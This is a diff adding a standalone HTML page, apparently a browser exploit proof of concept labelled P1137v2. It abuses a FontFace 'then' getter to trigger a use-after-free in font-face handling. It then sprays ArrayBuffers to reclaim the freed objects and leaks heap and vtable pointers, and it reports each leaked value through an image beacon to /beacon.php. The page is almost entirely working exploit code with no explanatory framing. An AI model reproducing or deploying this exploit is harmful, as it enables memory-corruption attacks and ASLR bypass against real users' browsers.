@@ -1,0 +1,95 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1137v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1137v2: SLIM SOURCE VTABLE CAPTURE ===');
+B('P1137V2-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+// Key sizes: skip tiny ones, focus on likely CSSFontFaceSource sizes
+var SIZES=[48,64,96,128,160,192,256,384];
+var N=40; // buffers per size
+var allSpray={};
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:s"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('v'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // CSSFontFace + CSSFontFaceSource both freed NOW
+  // Spray all sizes immediately
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    allSpray[sz]=[];
+    for(var k=0;k<N;k++){
+      allSpray[sz].push(new ArrayBuffer(sz));
+    }
+  }
+  try{document.fonts.check('1em s'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em v'+r+', s'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!allSpray[192]){B('P1137V2-MISS','no_uaf');log('fail','No UAF');return;}
+
+  var results=[];
+  var cffQ11=null,cffQ13=null;
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    var nzCount=0;
+
+    for(var k=0;k<bufs.length;k++){
+      var v=new BigUint64Array(bufs[k]);
+      var nz=false;
+      for(var q=0;q<v.length;q++){
+        if(v[q]!==0n){nz=true;break;}
+      }
+      if(!nz)continue;
+      nzCount++;
+
+      // Dump non-zero qwords
+      var dump=[];
+      for(var q=0;q<v.length;q++){
+        if(v[q]!==0n){
+          var val=v[q];
+          var hi=Number(val>>32n);
+          var tag=(val===1n)?'RC':(hi>=0x10&&hi<=0xFF)?'HP':(hi>=0x100&&hi<0xFFFF&&(val&7n)===0n)?'VT?':'?';
+          dump.push('q'+q+'='+hex64(val)+'('+tag+')');
+        }
+      }
+
+      // CSSFontFace check (sz=192, q0=1, q11+q13 nonzero)
+      if(sz===192&&v[0]===1n&&v[11]!==0n&&v[13]!==0n){
+        cffQ11=v[11];cffQ13=v[13];
+      }
+
+      results.push({sz:sz,k:k,dump:dump.join(',')});
+      B('P1137V2-NZ','sz='+sz+'|k='+k+'|'+dump.join(','));
+      log('ptr','sz='+sz+' buf['+k+']: '+dump.slice(0,6).join(' '));
+    }
+
+    if(nzCount>0) B('P1137V2-SZ-'+sz,'hits='+nzCount+'/'+bufs.length);
+  }
+
+  if(cffQ11) B('P1137V2-CFF','q11='+hex64(cffQ11)+'|q13='+hex64(cffQ13));
+  B('P1137V2-DONE','total_nz='+results.length+'|cff='+(cffQ11?hex64(cffQ11):'none'));
+  log('phase','=== DONE: '+results.length+' non-zero buffers ===');
+},10);
+</script></body></html>
